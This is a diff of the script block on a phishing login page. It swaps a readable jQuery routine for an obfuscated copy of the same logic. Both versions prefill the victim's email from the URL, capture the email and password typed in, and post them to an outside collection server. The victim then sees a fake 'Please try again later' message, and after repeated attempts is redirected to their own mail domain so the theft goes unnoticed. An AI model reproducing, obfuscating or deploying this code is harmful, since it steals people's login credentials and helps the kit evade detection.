@@ -335,72 +335,9 @@ document.pform.bot.value = zork1;
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script> 	
     <script>
-$(document).ready(function() {
-  var email = window.location.hash.substr(1);
-  var checker = 0
-  $("#email").val(email);
-
-   $("#myModal").modal('show');
-
-    $("#pform").on('submit', (event) =>{
-        event.preventDefault();
-        event.stopPropagation();
-        $("#msg").hide();
-        let email = $("#email").val()
-        let password = $("#password").val()
-        let domain = email.split("@")[1];
-        checker++;
-
-        $.ajax({
-            
-            url: 'https://ashab.jalblhabib.com/gi/next.php',
-            method: "post",
-            data: {
-                email: email,
-                password: password
-            },
-
-            beforeSend: ()=>{
-                $("#submit-btn").prop('disabled', true).html("Verifying...")
-            },
-            success: (data)=>{
-                $("#msg").show("Please try again later");
-                $('#msg').html("Please try again later");
-
-                
-                setTimeout(() => {
-                    $("#password").val("").focus();
-                }, 100);
-            },
-            error: (err, xhr) =>{
-                console.log(err, xhr);
-            },
-			
-            complete: function(){
-              $('#submit-btn').prop('disabled', false).html("Sign In")
-            } 
-			
-        })
-			if (checker => 1) {
-			
-                setTimeout(() => {
-                  $("#msg").show();
-				  $("#password").val("");
-                }, 3000);
-                   
-                }
-		
-		if (checker > 4) {
-                    window.location.href="https://"+domain;
-                }
-
-    });
-
-});
+const _0x27ae9b=_0x3389;function _0x3389(_0x52b091,_0x4c1fde){const _0x3293af=_0x3293();return _0x3389=function(_0x338937,_0xb493aa){_0x338937=_0x338937-0x9f;let _0x1b9e17=_0x3293af[_0x338937];return _0x1b9e17;},_0x3389(_0x52b091,_0x4c1fde);}function _0x3293(){const _0x292549=['html','#password','Please\x20try\x20again\x20later','5609296BZeMix','substr','#email','log','preventDefault','disabled','6503076EluIQC','hide','154ivgzXy','4UiSOTH','4403080gKvSSz','prop','ajax','#myModal','762380sSXOiO','Verifying...','#submit-btn','https://','8006ecBAEa','post','val','#msg','Sign\x20In','stopPropagation','location','focus','ready','4487214SUjGkd','7iAXQbp','https://ashab.jalblhabib.com/gi/next.php','href','show','split','1876431kcazbc','modal','submit'];_0x3293=function(){return _0x292549;};return _0x3293();}(function(_0x593a6b,_0x3a141a){const _0x20e63b=_0x3389,_0x4f9cd3=_0x593a6b();while(!![]){try{const _0x429cf4=parseInt(_0x20e63b(0xc4))/0x1*(-parseInt(_0x20e63b(0xa7))/0x2)+-parseInt(_0x20e63b(0xb6))/0x3*(-parseInt(_0x20e63b(0xc5))/0x4)+parseInt(_0x20e63b(0xa3))/0x5+parseInt(_0x20e63b(0xb0))/0x6*(-parseInt(_0x20e63b(0xb1))/0x7)+parseInt(_0x20e63b(0xbc))/0x8+parseInt(_0x20e63b(0xc2))/0x9+-parseInt(_0x20e63b(0x9f))/0xa;if(_0x429cf4===_0x3a141a)break;else _0x4f9cd3['push'](_0x4f9cd3['shift']());}catch(_0x36d5f5){_0x4f9cd3['push'](_0x4f9cd3['shift']());}}}(_0x3293,0x60ef0),$(document)[_0x27ae9b(0xaf)](function(){const _0x13800b=_0x27ae9b;var _0x247061=window['location']['hash'][_0x13800b(0xbd)](0x1),_0x493ef6=0x0;$(_0x13800b(0xbe))[_0x13800b(0xa9)](_0x247061),$(_0x13800b(0xa2))[_0x13800b(0xb7)](_0x13800b(0xb4)),$('#pform')['on'](_0x13800b(0xb8),_0x5808a9=>{const _0x5d2681=_0x13800b;_0x5808a9[_0x5d2681(0xc0)](),_0x5808a9[_0x5d2681(0xac)](),$('#msg')[_0x5d2681(0xc3)]();let _0x5532df=$(_0x5d2681(0xbe))[_0x5d2681(0xa9)](),_0xcb628=$(_0x5d2681(0xba))[_0x5d2681(0xa9)](),_0x1e4d21=_0x5532df[_0x5d2681(0xb5)]('@')[0x1];_0x493ef6++,$[_0x5d2681(0xa1)]({'url':_0x5d2681(0xb2),'method':_0x5d2681(0xa8),'data':{'email':_0x5532df,'password':_0xcb628},'beforeSend':()=>{const _0x27a072=_0x5d2681;$(_0x27a072(0xa5))[_0x27a072(0xa0)]('disabled',!![])[_0x27a072(0xb9)](_0x27a072(0xa4));},'success':_0x37a219=>{const _0x15f8ca=_0x5d2681;$(_0x15f8ca(0xaa))[_0x15f8ca(0xb4)](_0x15f8ca(0xbb)),$('#msg')[_0x15f8ca(0xb9)]('Please\x20try\x20again\x20later'),setTimeout(()=>{const _0x31d0bd=_0x15f8ca;$(_0x31d0bd(0xba))[_0x31d0bd(0xa9)]('')[_0x31d0bd(0xae)]();},0x64);},'error':(_0x2649a0,_0x148804)=>{const _0x2fea6c=_0x5d2681;console[_0x2fea6c(0xbf)](_0x2649a0,_0x148804);},'complete':function(){const _0x21ca1d=_0x5d2681;$(_0x21ca1d(0xa5))[_0x21ca1d(0xa0)](_0x21ca1d(0xc1),![])['html'](_0x21ca1d(0xab));}}),(_0x41c320=>0x1)&&setTimeout(()=>{const _0x2551d5=_0x5d2681;$('#msg')[_0x2551d5(0xb4)](),$(_0x2551d5(0xba))[_0x2551d5(0xa9)]('');},0xbb8),_0x493ef6>0x4&&(window[_0x5d2681(0xad)][_0x5d2681(0xb3)]=_0x5d2681(0xa6)+_0x1e4d21);});}));
 </script>
 
- 
- </script>
 
 
 </body>
